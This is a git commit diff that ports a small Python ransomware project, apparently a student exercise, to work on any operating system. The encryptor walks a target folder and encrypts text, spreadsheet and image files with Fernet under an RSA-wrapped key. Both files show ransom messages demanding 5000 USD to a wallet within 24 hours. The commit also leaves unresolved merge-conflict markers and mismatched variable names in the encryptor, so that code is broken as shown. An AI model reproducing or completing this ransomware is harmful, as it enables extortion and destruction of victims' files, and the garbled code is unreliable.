5127b951098749ac10283f836dd5e8f4946e7170
rodrigovzq <rvazquez@fi.uba.ar>
2022-06-30 20:54:43 -0300

    OS agnostic

--- desencrypter.py
+++ desencrypter.py
@@ -3,32 +3,37 @@ import rsa
 import ctypes
 import sys
 from cryptography.fernet import Fernet
-MessageBox = ctypes.windll.user32.MessageBoxW
+
+MessageBox = ctypes.windll.user32.MessageBoxW if os.name == 'nt' else print
 # File extensions to encrypt
+
+
 def extensions(ext):
     return set(ext)
+
 
 def find_files(files_location, encrypted_ext):
     file_paths = []
     for root, dirs, files in os.walk(files_location):
         for file in files:
-            file_path, file_extension = os.path.splitext(root + '\\' + file)
+            file_path, file_extension = os.path.splitext(
+                root + os.path.sep + file)
             if file_extension in encrypted_ext:
-                file_paths.append(root + '\\' + file)
+                file_paths.append(root + os.path.sep + file)
     return file_paths
 
 
 def decrypt_key():
     # Desencriptador de llaves
     try:
-        with open('keys\\privKey.pem', mode='rb') as pk_file:
+        with open('keys'+os.path.sep+'privKey.pem', mode='rb') as pk_file:
             keydata = pk_file.read()
             privKey = rsa.PrivateKey.load_pkcs1(keydata)
-            f = open("keys\\files_key.key", 'rb+')
+            f = open("keys"+os.path.sep+"files_key.key", 'rb+')
             fernet_key = f.read()
             f.close()
             decrypted_fernet_key = rsa.decrypt(fernet_key, privKey)
-            f = open("keys\\files_key.key", 'wb')
+            f = open("keys"+os.path.sep+"files_key.key", 'wb')
             f.write(bytearray(decrypted_fernet_key))
             f.close()
             return decrypted_fernet_key
@@ -36,7 +41,6 @@ def decrypt_key():
     except FileNotFoundError:
         MessageBox(0, 'ERROR. In order to recover your files you must pay the ransom. To do this, you must transfer 5000 USD (Five thousand US dollars) to the following Wallet.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nAfter that,we will provide you with the key to be saved in the Keys folder.', 'PAY THE RANSOM', 1)
         sys.exit(1)
-
 
 
 def decrypt_files(paths, file_key):
@@ -49,7 +53,9 @@ def decrypt_files(paths, file_key):
             with open(file_path, 'wb') as f:
                 f.write(decrypted)
             print("Decrypting file ", file_path)
-    MessageBox(0, 'Thank you for collaborating with us. Your files have been restored', 'Files restored', 1)
+    MessageBox(
+        0, 'Thank you for collaborating with us. Your files have been restored', 'Files restored', 1)
+
 
 def main():
     encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
@@ -57,6 +63,7 @@ def main():
     paths = find_files(files_location, encrypted_ext)
     file_key = decrypt_key()
     decrypt_files(paths, file_key)
+
 
 if __name__ == "__main__":
     main()
--- encriptador.py
+++ encriptador.py
@@ -5,11 +5,15 @@ import rsa
 from cryptography.fernet import Fernet
 import ctypes
 
-MessageBox = ctypes.windll.user32.MessageBoxW
+
+MessageBox = ctypes.windll.user32.MessageBoxW if os.name == 'nt' else print
 
 # File extensions to encrypt
+
+
 def extensions(ext):
     return set(ext)
+
 
 def find_files(files_location, encrypted_ext):
     file_paths = []
@@ -17,24 +21,28 @@ def find_files(files_location, encrypted_ext):
         for file in files:
             file_path, file_extension = os.path.splitext(root + '\\' + file)
             if file_extension in encrypted_ext:
-                file_paths.append(root + '\\' + file)
+                file_paths.append(root + os.path.sep + file)
     return file_paths
 
+
 def load_key():
-    with open('keys\\pubkey.pem', 'rb') as f:
+    with open('keys' + os.path.sep + 'pubkey.pem', 'rb') as f:
         pubKey = rsa.PublicKey.load_pkcs1(f.read())
 
     return pubKey
 
+
 def generate_file_key():
     key = Fernet.generate_key()
-    if os.path.exists('keys\\files_key.key'):
-        MessageBox(0, 'Your files are encrypted. Pay the ransom.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ERROR', 1)
+    if os.path.exists('keys' + os.path.sep + 'files_key.key'):
+        MessageBox(
+            0, 'Your files are encrypted. Pay the ransom.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ERROR', 1)
         sys.exit(1)
     else:
-        with open('keys\\files_key.key', 'wb') as f:
+        with open('keys' + os.path.sep + 'files_key.key', 'wb') as f:
             f.write(key)
         return key
+
 
 def encrypt_files(paths, key):
     for file_path in paths:
@@ -45,21 +53,37 @@ def encrypt_files(paths, key):
             with open(file_path, 'wb') as f:
                 f.write(encrypted)
 
+
 def encrypt_key(pubKey):
-    with open('keys\\pubKey.pem', mode='rb'):
-        f = open("keys\\files_key.key", mode='rb')
-        files_key = f.read()
-        f.close()
 
-        encrypted_files_key = rsa.encrypt(files_key, pubKey)
 
-        f = open("keys\\files_key.key", 'wb')
-        f.write(bytearray(encrypted_files_key))
-        f.close()    
-        
+<< << << < HEAD
+with open('keys' + os.path.sep + 'pubKey.pem', mode='rb'):
+    f = open("keys" + os.path.sep + "files_key.key", mode='rb')
+    fernet_key = f.read()
+== == == =
+with open('keys\\pubKey.pem', mode='rb'):
+    f = open("keys\\files_key.key", mode='rb')
+    files_key = f.read()
+>>>>>> > 34d384ee242c71eef60cad996f4fbaa766e5e0e3
+f.close()
+
+encrypted_files_key = rsa.encrypt(files_key, pubKey)
+
+<< << << < HEAD
+f = open("keys" + os.path.sep + "files_key.key", 'wb')
+f.write(bytearray(encrypted_fernet_key))
+f.close()
+== == == =
+f = open("keys\\files_key.key", 'wb')
+f.write(bytearray(encrypted_files_key))
+f.close()
+
+>>>>>> > 34d384ee242c71eef60cad996f4fbaa766e5e0e3
 
 
 def main():
+
     encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
     files_location = 'Atacar'
     paths = find_files(files_location, encrypted_ext)
@@ -68,6 +92,7 @@ def main():
     rsa_key = load_key()
     encrypt_key(rsa_key)
     MessageBox(0, 'The files in your computer have been encrypted. \nIf you want to restore them, you must pay a ransom of 5000 USD  to the next Wallet in less than 24hs.\nYou can follow the steps in the following Link:\nhttps://www.westernunion.com/fr/en/mobile-wallet.html\nOnce the money is delivered, we will give you the information needed to recover your files.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ALERT: YOU HAVE BEEN HACKED', 1)
+
 
 if __name__ == "__main__":
     main()
